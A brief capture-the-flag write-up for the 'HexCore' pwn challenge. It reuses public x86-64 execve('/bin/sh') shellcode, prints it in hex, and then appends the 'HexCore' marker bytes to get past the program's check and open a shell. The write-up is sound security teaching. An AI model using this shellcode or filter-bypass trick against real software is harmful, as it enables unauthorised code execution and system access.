# Pwn - HexCore

>> Pwn - easy
>
>You've gained access to the secret HexCore Terminal. However, it seems to require a HexCore...

## Writeup

This is a shell injection challenge. The shellcode needs to be in hex and max 32 bytes. We can try and use the shellcode from https://www.exploit-db.com/exploits/46907. The shellcode in hex is:

```
4831f65648bf2f62696e2f2f736857545f6a3b58990f05
```

Inserting it into the program gives `No 'HexCore' detected.` By looking in `hexcore.c`, we can see that the shellcode needs to contain the sequence `{ 0x48, 0x65, 0x78, 0x43, 0x6f, 0x72, 0x65 }`. This can easily be added at the end of the shellcode because it is never executed. So we append the sequence to the initial shellcode and get

```
4831f65648bf2f62696e2f2f736857545f6a3b58990f05486578436f7265
```

Inserting this into the program gives us a shellcode where we can use `ls` and `cat flag.txt`.